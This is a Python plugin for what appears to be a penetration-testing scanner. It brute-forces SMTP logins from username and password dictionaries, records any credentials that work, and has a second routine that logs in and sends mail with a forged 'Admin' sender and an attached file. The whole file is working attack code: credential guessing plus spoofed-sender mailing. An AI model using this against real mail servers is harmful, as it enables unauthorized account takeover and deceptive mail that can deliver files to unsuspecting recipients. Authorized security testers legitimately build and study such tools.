#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import os
import asyncio
import aiosmtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.header import Header
from email.utils import parseaddr
from email.utils import formataddr
from email.header import Header
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.SMTP
        self.name = 'smtp burst'
        self.keyword = ['smtp', 'burst']
        self.info = 'smtp burst'
        self.type = 'weakpass'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)


    async def prove(self):
        usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(
            'dict/smtp_usernames.txt')
        passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(
            'dict/smtp_passwords.txt')
        async for (username, password) in self.generate_dict(usernamedic, passworddic):
            if self.target_port == 465:
                use_tls = True
            else:
                use_tls = False
            try:
                async with aiosmtplib.SMTP(hostname=self.target_host, port=self.target_port, use_tls=use_tls) as smtp:
                    await smtp.login(username, password)
                    self.flag = 1
                    self.req.append({"username": username, "password": password})
                    self.res.append({"info": username + "/" + password, "key": 'smtp'})
                    return
            except aiosmtplib.SMTPException as e:
                    pass


    async def exec(self):
        mail_user = self.parameter['u']
        mail_pass = self.parameter['p']
        sender = self.parameter['s']
        receivers = self.parameter['r'].split(',')
        filename = self.parameter['f']
        content = self.parameter['c']
        mail_host = self.target_host
        mail_port = self.target_port
        content = '''
                    Helo,
                        %s 
                                                                                                —— by Tester
                    ''' % content
        message = MIMEMultipart()
        message['From'] = "Admin<%s>" % sender
        message['To'] = ','.join(receivers)
        message['Subject'] = Header(filename, 'utf-8')
        message.attach(MIMEText(content, 'plain', 'utf-8'))

        with open(os.path.join(filename), 'rb') as f:
            att = MIMEText(f.read(), 'base64', 'utf-8')
            att["Content-Type"] = 'application/octet-stream'
            att.add_header("Content-Disposition", "attachment", filename=("utf-8", "", 'test.txt'))
            message.attach(att)

        n = 3
        while n > 0:
            if self.target_port == 25:
                use_tls = False
            else:
                use_tls = True
            try:
                async with aiosmtplib.SMTP(hostname=mail_host, port=mail_port,
                                           use_tls=use_tls) as smtp:
                    await smtp.login(mail_user, mail_pass)
                    await smtp.send_message(message, sender, receivers)
                    # await smtp.send_message(message.as_string())
                    self.flag = 1
                    self.res.append({"info": mail_user + "/" + mail_pass, "key": 'smtp'})
                    return
            except aiosmtplib.SMTPException as e:
                pass
            await asyncio.sleep(10)
            n -= 1

